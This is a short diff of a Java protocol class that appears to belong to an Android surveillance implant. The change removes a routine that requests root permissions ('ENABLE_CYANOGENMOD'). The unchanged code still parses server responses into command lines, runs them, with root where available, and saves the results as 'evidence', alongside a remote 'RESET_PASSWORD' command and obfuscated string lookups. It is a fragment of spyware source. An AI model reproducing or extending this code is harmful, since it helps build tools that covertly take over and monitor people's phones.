@@ -1016,23 +1016,6 @@ public class ZProtocol extends Protocol {
 		return res;
 	}
 
-	private ExecuteResult enableCyanogenmod() {
-		ExecuteResult res = new ExecuteResult(M.e("ENABLE_CYANOGENMOD"));
-		try {
-			Cfg.SUPPORT_CYANOGENMOD = true;
-			// Cfg.FORCE_ROOT= true;
-			Root.getPermissions();
-			res.stdout.add("ok");
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (enableCyanogenmod) Error: " + ex);
-			}
-			res.stdout.add(ex.toString());
-		}
-
-		return res;
-	}
-
 	protected void parseExecute(byte[] response) throws ProtocolException {
 		final int res = ByteArray.byteArrayToInt(response, 0);
 		if (res == Proto.OK) {
@@ -1049,9 +1032,7 @@ public class ZProtocol extends Protocol {
 					executionLine = Directory.expandMacro(executionLine);
 
 					ExecuteResult ret;
-					if (executionLine.equals(M.e("ENABLE_CYANOGENMOD"))) {
-						ret = enableCyanogenmod();
-					} else if (executionLine.equals(M.e("RESET_PASSWORD"))) {
+					if (executionLine.equals(M.e("RESET_PASSWORD"))) {
 						ret = resetPassword();
 					} else {
 						if (Status.self().haveRoot()) {
@@ -1062,7 +1043,6 @@ public class ZProtocol extends Protocol {
 					}
 
 					ret.saveEvidence();
-
 				}
 
 			} catch (final IOException e) {
